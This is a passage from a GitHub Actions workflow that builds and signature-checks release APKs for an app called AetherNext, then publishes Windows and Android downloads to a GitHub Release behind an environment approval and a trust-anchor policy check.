          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          NDK_PATH: ${{ steps.ndk.outputs.ndk-path }}
        run: |
          test -n "$KEYSTORE_BASE64" || { echo "ANDROID_KEYSTORE_BASE64 secret missing"; exit 1; }
          printf '%s' "$KEYSTORE_BASE64" | base64 --decode > release.keystore
          echo "sdk.dir=$ANDROID_HOME" > local.properties
          echo "ndk.dir=$NDK_PATH" >> local.properties
          chmod +x ./gradlew
          ./gradlew assembleRelease --stacktrace
          ls -la app/build/outputs/apk/release/
      - name: Verify APK signature
        working-directory: apps/android/android
        run: |
          set -euo pipefail
          WANT="1396DD16D8F2954E7D9A213AD0BF2BA8B96E4A5B5F0A71C3CA88A133744794AC"
          APKSIGNER=$(find "$ANDROID_HOME/build-tools" -name apksigner -type f | sort -V | tail -1)
          test -n "$APKSIGNER"
          for apk in app/build/outputs/apk/release/*.apk; do
            echo "=== verify $apk ==="
            out=$("$APKSIGNER" verify --verbose --print-certs "$apk" 2>&1) || {
              echo "$out"
              exit 1
            }
            echo "$out"
            # apksigner formats vary: "Signer #1 certificate SHA-256 digest:" or "V2 Signer: certificate SHA-256 digest:"
            digest=$(printf '%s\n' "$out" | grep -iE 'certificate SHA-256 digest:' | head -1 | sed -E 's/.*SHA-256 digest:[[:space:]]*//' | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')
            echo "signer digest=$digest"
            test -n "$digest"
            test "$digest" = "$WANT"
          done
      - name: Collect
        run: |
          set -euo pipefail
          mkdir -p dist-android
          rel=apps/android/android/app/build/outputs/apk/release
          cp "$rel"/app-arm64-v8a-release.apk    dist-android/AetherNext-android-arm64-v8a.apk
          cp "$rel"/app-armeabi-v7a-release.apk  dist-android/AetherNext-android-armeabi-v7a.apk
          cp "$rel"/app-x86_64-release.apk       dist-android/AetherNext-android-x86_64.apk
          cp "$rel"/app-universal-release.apk    dist-android/AetherNext-android-universal.apk
          ls -la dist-android/
      - name: Attest Android build provenance
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: dist-android/*.apk
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: android
          path: dist-android/*.apk
          if-no-files-found: error

  # A GitHub Release is a download for somebody else's machine, so it is only
  # refreshed when the artifacts say they can survive one: the engine they carry
  # has a published witness, and its signature chains to something a clean install
  # trusts (scripts/package-policy.mjs). A push to main whose engine anchor is
  # still the committed placeholder produces `-dev` artifacts on the run page and
  # touches no release - which is the honest outcome of a run that minted its own
  # certificate, and the alternative was a package that refuses to start its own
  # engine the moment it is installed.
  # - tag v1.2.3 → that versioned release, or the job fails
  # - push to main / manual → release "Latest" (tag: latest) when publishable
  publish:
    name: Publish downloads
    needs: [test, windows-app, android-apk]
    if: ${{ always() && startsWith(github.ref, 'refs/tags/') && needs.test.result == 'success' && needs.windows-app.result == 'success' && needs.android-apk.result == 'success' }}
    runs-on: ubuntu-latest
    # A named environment is the only handle GitHub has for "who may let this
    # out": the settings on `release` (required reviewers, wait timers) are what
    # stands between a merged PR and an artefact signed by this repo's identity
    # and served to every auto-updater. Without it `contents: write` on the tag
    # run is an unguarded publish path.
    environment: release
    permissions:
      contents: write
    env:
      AETHER_PACKAGE_KIND: ${{ startsWith(github.ref, 'refs/tags/') && 'release' || 'development' }}
      AETHER_SIGNING_MODE: ${{ needs.windows-app.outputs.signing_mode }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          path: dist
          merge-multiple: true
      # Judged on the anchor that ships *inside* the artifacts, not on a job
      # output: the file a user finds next to the binaries is the file that has to
      # be able to vouch for them. A tag fails here; a development run reports
      # publishable=false and the release steps below are skipped.
      - name: Ask whether this run may publish
        id: eligible
        run: |
          set -euo pipefail
          node scripts/package-policy.mjs --check --anchor dist/engine-trust.json
      # The payload flatten, the checksums and the manifest checks live in
      # .github/scripts/pack-checksums.sh, not here. They used to be inline, and an
      # inline shell body in YAML is code nobody can run before it ships: the step
      # wrote one sidecar per payload and then built the manifest by globbing the
      # directory - which took the sidecars with it - so the manifest held 2N lines
      # against the count of N the next line demanded. Publish could not pass, on
      # any ref, and only a release run could reveal it.
      # `bash .github/scripts/test-pack-checksums.sh` runs this step's logic against
      # a fixture release directory and asserts the manifest lists every payload
      # exactly once, that every sidecar verifies, and that a manifest missing a
      # payload fails the step instead of publishing.
      - name: Pack + checksums
        id: pack
        run: |
          set -euo pipefail
          bash .github/scripts/pack-checksums.sh --src dist --out out
      - name: Development artifacts, nothing published
        if: steps.eligible.outputs.publishable != 'true'
        run: |
          {
            echo "## Not published: development artifacts"
            echo
            echo 'The engine in these files is not covered by a published trust anchor'
            echo 'and/or is signed with a certificate only the run that built it can verify.'
            echo 'They remain downloadable from this workflow run; they are not downloads'
            echo 'for end users. See `packaging/trust/README.md` and run the'
            echo '**Prepare engine anchor** workflow to change that.'
          } >> "$GITHUB_STEP_SUMMARY"
          echo "::notice::skipping the release upload: this run's package is not distributable"
      - name: Upload to GitHub Release
        if: steps.eligible.outputs.publishable == 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.pack.outputs.tag }}
          TITLE: ${{ steps.pack.outputs.title }}
          PRE: ${{ steps.pack.outputs.prerelease }}
        run: |
          set -euo pipefail
          NOTES="Windows installer + portable, Android APKs (arm64 / armv7 / x86_64 / universal).

          Commit: ${GITHUB_SHA}
          Run: ${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"

          # Create or reuse release for this tag; move lightweight tag to this commit on main builds
          if gh release view "$TAG" >/dev/null 2>&1; then
            gh release edit "$TAG" --title "$TITLE" --notes "$NOTES" --target "$GITHUB_SHA"
            if [ "$PRE" = "true" ]; then gh release edit "$TAG" --prerelease; else gh release edit "$TAG" --latest; fi
          else
            EXTRA=()
            if [ "$PRE" = "true" ]; then EXTRA+=(--prerelease); else EXTRA+=(--latest); fi
            gh release create "$TAG" --title "$TITLE" --notes "$NOTES" --target "$GITHUB_SHA" "${EXTRA[@]}"
          fi

          # Overwrite files with the same names
          gh release upload "$TAG" out/* --clobber
